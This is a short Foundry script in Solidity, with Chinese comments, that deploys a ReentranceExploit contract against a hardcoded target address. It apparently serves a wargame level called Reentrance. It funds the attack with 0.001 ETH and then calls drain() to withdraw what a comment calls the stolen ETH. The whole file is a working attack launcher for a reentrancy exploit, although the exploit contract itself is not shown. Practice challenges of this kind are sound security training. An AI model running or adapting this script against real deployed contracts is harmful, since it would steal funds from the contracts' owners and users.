// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ReentranceExploit} from "../src/ReentranceExploit.sol";

contract ReentranceAttack is Script {
    function run() external {
        // 替换为你的关卡实例地址
        address payable targetAddr = payable(
            0x466143FF65cfc5bF49a0D42e236b41a60240e2dF
        );

        vm.startBroadcast();
        ReentranceExploit exploit = new ReentranceExploit(targetAddr);

        // 发送 0.001 ETH 作为攻击资金（需 >= 合约当前余额）
        exploit.attack{value: 0.001 ether}();

        // 把偷来的ETH取出来
        exploit.drain();
        vm.stopBroadcast();
    }
}
